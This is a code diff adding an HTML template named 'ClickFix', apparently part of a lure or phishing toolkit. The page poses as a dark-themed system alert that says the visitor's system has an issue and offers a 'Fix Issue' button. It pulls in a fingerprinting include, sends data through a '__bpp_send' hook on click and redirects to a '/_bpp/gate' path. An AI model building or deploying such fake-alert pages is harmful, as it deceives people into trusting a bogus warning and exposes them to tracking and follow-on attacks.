@@ -1,0 +1,77 @@
+<!-- BPP-Template
+name: ClickFix
+description: Fake system issue requiring user action with dark theme
+-->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>{{ title | default('Action Required') }}</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    * { margin:0; padding:0; box-sizing:border-box }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      background: #1a1a2e; color: #e0e0e0;
+      display: flex; align-items: center; justify-content: center;
+      min-height: 100vh;
+    }
+    .container {
+      background: #16213e; border: 1px solid #0f3460;
+      border-radius: 12px; padding: 40px; max-width: 480px; width: 92%;
+      box-shadow: 0 8px 32px rgba(0,0,0,.3);
+    }
+    .icon {
+      width: 56px; height: 56px; margin: 0 auto 20px;
+      background: #e94560; border-radius: 50%;
+      display: flex; align-items: center; justify-content: center;
+      font-size: 28px;
+    }
+    h1 { font-size: 22px; text-align: center; margin-bottom: 12px; color: #fff }
+    .msg { font-size: 14px; line-height: 1.6; text-align: center; margin-bottom: 24px; color: #a0a0b8 }
+    .steps {
+      background: #0f3460; border-radius: 8px; padding: 16px 20px;
+      margin-bottom: 24px; font-size: 13px; line-height: 1.8;
+    }
+    .steps li { margin-bottom: 4px }
+    .btn {
+      display: block; width: 100%; padding: 14px;
+      background: #e94560; color: #fff; border: none;
+      border-radius: 8px; font-size: 16px; font-weight: 600;
+      cursor: pointer; transition: background .2s;
+    }
+    .btn:hover { background: #c73650 }
+    .spinner { display: none; margin: 20px auto; width: 32px; height: 32px;
+      border: 3px solid #333; border-top-color: #e94560;
+      border-radius: 50%; animation: spin .8s linear infinite;
+    }
+    @keyframes spin { to { transform: rotate(360deg) } }
+    .foot { text-align: center; margin-top: 20px; font-size: 11px; color: #555 }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="icon">&#x26A0;&#xFE0F;</div>
+    <h1>{{ title | default('Action Required') }}</h1>
+    <p class="msg">{{ message | default('Your system has detected an issue that requires verification.') }}</p>
+    <ol class="steps">
+      <li>Click the button below to begin verification</li>
+      <li>Follow the on-screen instructions</li>
+      <li>Wait for the process to complete</li>
+    </ol>
+    <button class="btn" id="fixBtn">{{ button_text | default('Fix Issue') }}</button>
+    <div class="spinner" id="spinner"></div>
+    <div class="foot">{{ brand }}</div>
+  </div>
+  {% include '_fingerprint.html' %}
+  <script>
+    document.getElementById("fixBtn").addEventListener("click", function() {
+      this.style.display = "none";
+      document.getElementById("spinner").style.display = "block";
+      window.__bpp_send(function() {
+        window.location.href = "/_bpp/gate";
+      });
+    });
+  </script>
+</body>
+</html>
